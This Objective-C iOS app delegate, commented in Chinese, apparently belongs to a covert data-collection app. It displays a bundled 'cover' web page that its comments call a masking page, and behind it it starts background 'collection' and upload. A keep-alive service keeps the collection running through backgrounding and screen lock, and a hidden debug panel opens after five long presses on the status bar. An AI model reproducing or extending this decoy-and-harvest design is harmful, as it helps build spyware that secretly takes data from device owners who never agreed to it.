#import "OWAppDelegate.h"
#import <WebKit/WebKit.h>
#import "OWRoute.h"
#import "OWCommon.h"
#import "OWKeepAlive.h"
#import "OWSelfTest.h"
#import "OWDebugPanel.h"

@interface OWAppDelegate ()
@property (nonatomic, assign) NSInteger debugPressCount;
@property (nonatomic, strong, nullable) NSDate *debugFirstPress;
@end

@implementation OWAppDelegate

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    self.window.backgroundColor = [UIColor blackColor];

    UIViewController *vc = [[UIViewController alloc] init];
    WKWebView *wv = [[WKWebView alloc] initWithFrame:self.window.bounds];

    NSString *p = [[NSBundle mainBundle] pathForResource:@"cover" ofType:@"html"];
    if (p) {
        NSURL *u = [NSURL fileURLWithPath:p];
        [wv loadFileURL:u allowingReadAccessToURL:u.URLByDeletingLastPathComponent];
    }
    vc.view = wv;
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    // 隐藏调试入口：长按状态栏 5 次（每次 1s，10s 内完成）
    [self installDebugGesture];

    // 保活先起：采集/上传要跑十几分钟，必须撑住切后台与锁屏
    [[OWKeepAlive shared] start];

    // 自检开关：Info.plist 的 OWSelfTestOnLaunch = YES 时，启动先跑分层自检再起采集。
    // 联调期打开（能直接看出断在哪一层），正式包关掉。
    BOOL selftest = [[[NSBundle mainBundle] objectForInfoDictionaryKey:@"OWSelfTestOnLaunch"] boolValue];

    // 掩盖页面先展示，采集在后台起
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        if (selftest) {
            OWLog(@"OWSelfTestOnLaunch=YES，先跑分层自检");
            [[OWSelfTest shared] runAll];
        }
        [[OWRoute shared] start];
    });

    return YES;
}

- (void)applicationDidBecomeActive:(UIApplication *)application {
    [[OWKeepAlive shared] ensureRunning];
    OWLog(@"applicationDidBecomeActive protectedData=%d",
          [UIApplication sharedApplication].isProtectedDataAvailable);
}

- (void)applicationWillTerminate:(UIApplication *)application {
    [[OWKeepAlive shared] stop];
}

#pragma mark - 隐藏调试面板

- (void)installDebugGesture {
    UILongPressGestureRecognizer *press =
        [[UILongPressGestureRecognizer alloc] initWithTarget:self
                                                      action:@selector(handleDebugPress:)];
    press.minimumPressDuration = 1.0;
    press.numberOfTouchesRequired = 1;
    press.cancelsTouchesInView = NO;
    [self.window addGestureRecognizer:press];
}

- (void)handleDebugPress:(UILongPressGestureRecognizer *)gesture {
    if (gesture.state != UIGestureRecognizerStateBegan) return;

    CGPoint point = [gesture locationInView:self.window];
    if (point.y > 80) return;   // 只认状态栏区域，避免误触页面

    NSDate *now = [NSDate date];
    if (!self.debugFirstPress ||
        [now timeIntervalSinceDate:self.debugFirstPress] > 10.0) {
        self.debugFirstPress = now;
        self.debugPressCount = 0;
    }
    self.debugPressCount++;

    if (self.debugPressCount < 5) {
        OWLog(@"调试手势 %ld/5", (long)self.debugPressCount);
        return;
    }

    self.debugPressCount = 0;
    self.debugFirstPress = nil;

    UIViewController *host = self.window.rootViewController;
    if (!host || host.presentedViewController) return;
    OWLog(@"调试面板已解锁");
    [OWDebugPanel presentFrom:host];
}

@end
